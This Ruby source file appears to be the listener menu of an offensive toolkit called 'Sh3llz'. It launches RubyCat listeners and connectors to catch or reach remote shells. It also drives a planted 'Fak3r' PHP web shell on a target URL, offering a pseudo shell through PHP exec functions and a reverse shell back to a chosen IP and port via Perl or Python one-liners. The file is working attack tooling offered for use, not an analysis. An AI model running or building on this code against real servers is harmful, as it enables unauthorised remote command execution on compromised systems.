# Listener & Various Shell Connector Tools

# Listener/Connector Tools Help Menu
def listener_usage
  puts "Available Options for Listener & Connector Tools Menu: ".underline.white
  puts "back ".light_yellow + "    => ".white + "Return to Main Menu".light_red
  puts "rubycat ".light_yellow + " => ".white + "RubyCat Listener".light_red
  puts "fak3r ".light_yellow + "   => ".white + "Fak3r Web Shell".light_red
  puts "generic ".light_yellow + " => ".white + "Generic Web Shell Connector".light_red
  print_line("")
end

# Listener/Connector Tools Menu
def listener_menu
  puts
  prompt = "(Sh3llz)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      listener_menu
    when /^h$|^help$|^ls$/i
      puts
      listener_usage
      listener_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to Main Menu....")
      main_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      listener_menu
    when /^local$|^OS$/i
      local_shell
      listener_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      listener_menu
    when /^ip$/i
      ip_info
      listener_menu
    when /^rubycat$|^rcat$|^rc$/i
      if File.exists?("#{HOME}extras/rubycat.rb")
        while(true)
          print_caution("Select RubyCat Usage: ")
          print_caution("1) Connect to Remote Shell")
          print_caution("2) Setup Listener to Receive Shell\n")
          answer = Readline.readline("   Enter Option: ", true)
          if answer.strip.chomp.to_i == 1
            remote_ip   = Readline.readline("   Enter Remote IP: ", true)
            remote_port = Readline.readline("   Enter Remote PORT: ", true)
            puts

            # Launch Listener  in new X-term window.... :)
            print_status("Attempting to Connect to Shell at #{remote_ip.strip.chomp}:#{remote_port.strip.chomp} in a new x-window.....")
            separate_process_exec = "xterm -title 'RubyCat' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'ruby #{HOME}extras/rubycat.rb -c -i #{remote_ip.strip.chomp} -p #{remote_port.strip.chomp}'\""
            fireNforget(separate_process_exec)
            print_status("Hopefully you reached the shell you were looking for...")
            break
          elsif answer.strip.chomp.to_i == 2
            listener_port = Readline.readline("   Enter Listener PORT: ", true)
            puts

            # Launch Listener  in new X-term window.... :)
            print_status("Opening Listener on port #{listener_port.strip.chomp} in a new x-window.....")
            separate_process_exec = "xterm -title 'RubyCat' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'ruby #{HOME}extras/rubycat.rb -l -p #{listener_port.strip.chomp}'\""
            fireNforget(separate_process_exec)
            print_status("Hopefully you caught the shell you were looking for...")
            break
          else
            puts
            print_error("Common, there are only 2 options!")
            print_error("Please try again...\n\n")
          end
        end
      else
        puts
        print_error("RubyCat seems to be missing!")
        print_error("Update your setup or try adding it to the #{HOME}extras/ directory")
        print_error("Find standalone version here: https://github.com/Hood3dRob1n/RubyCat")
        print_error("Come back and retry when you have things updated....\n")
      end
      listener_menu
    when /^fak3r$|^faker$/i
      print_status("Fak3r Shell Connector")
      target = Readline.readline("   Enter URL to Fak3r Shell: ", true)
      puts
      fake = Fak3r.new(target.strip.chomp)
      if fake.working?
        print_good("Communication Established!")
        print_caution("Next steps, select usage: ")
        # Run Commands: Exec Cmd, Pseudo Shell, Reverse Shell, Bind Shell, Read File, Upload, Download
        count = 1
        options =  [ 'Pseudo Shell', 'Reverse Shell' ]
        while(true)
          options.each { |x| print_caution("#{count}) #{x}"); count += 1; }
          puts
          answer = Readline.readline("   Enter Option: ", true)
          puts
          if answer.strip.chomp.to_i >= 1 and answer.strip.chomp.to_i <= options.size
            case answer.strip.chomp.to_i
            when 1
              c=1
              print_caution("Select PHP Exec Function to use: ")
              supported = [ 'raw', 'system', 'passthru', 'shell_exec', 'exec']
              supported.each { |y| print_caution("#{c}) #{y}"); c += 1; }
              puts
              answer = Readline.readline("   Enter Option: ", true)
              puts
              if answer.strip.chomp.to_i >= 1 and answer.strip.chomp.to_i <= supported.size
                case answer.strip.chomp.to_i
                when 1
                  function = 'raw'
                when 2
                  function = 'system'
                when 3
                  function = 'passthru'
                when 4
                  function = 'shell_exec'
                when 5
                  function = 'exec'
                end
              else
                print_error("Invalid Selection!")
                print_caution("Keeping default set to 'system'")
                function = 'system'
              end
              fake.pseudo_shell(function)
            when 2
              c=1
              print_caution("Select PHP Exec Function to use: ")
              supported = [ 'system', 'passthru', 'shell_exec', 'exec']
              supported.each { |y| print_caution("#{c}) #{y}"); c += 1; }
              puts
              answer = Readline.readline("   Enter Option: ", true)
              if answer.strip.chomp.to_i >= 1 and answer.strip.chomp.to_i <= supported.size
                case answer.strip.chomp.to_i
                when 1
                  function_name = 'system'
                when 2
                  function_name = 'passthru'
                when 3
                  function_name = 'shell_exec'
                when 4
                  function_name = 'exec'
                end
              else
                print_error("Invalid Selection!")
                print_caution("Keeping default set to 'system'")
                function_name = 'system'
              end
              reverse_ip = Readline.readline("   Enter IP: ", true)
              reverse_port = Readline.readline("   Enter Port: ", true)
              puts

              # Select Reverse Shell Method
              while(true)
                print_caution("Select Reverse Shell Method: ")
                print_caution("1) Perl Oneliner")
                print_caution("2) Python Oneliner")
                answer = Readline.readline("   Enter Shell Option: ", true)
                puts
                if answer.strip.chomp.to_i >= 1 and answer.strip.chomp.to_i <= 2
                  case answer.strip.chomp.to_i
                  when 1
                    command = 'perl'
                  when 2
                    command = 'python'
                  end
                  break
                else
                  puts
                  print_error("Invalid Option Selected!")
                  print_error("Please try again with option from menu below...\n\n")
                end
              end
              fake.rev_shell(function_name, command, reverse_ip.strip.chomp, reverse_port.strip.chomp.to_i)
            end
            break
          else
            puts
            print_error("Invalid Option Selected!")
            print_error("Please try again with option from menu below...\n\n")
          end
        end
      else
        puts
        print_error("Communication is NOT Working!")
        print_error("Check URL and try again or confirm things manually....\n")
      end
      listener_menu
    when /^generic$/i

      listener_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      listener_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      listener_menu
    end
  end
end
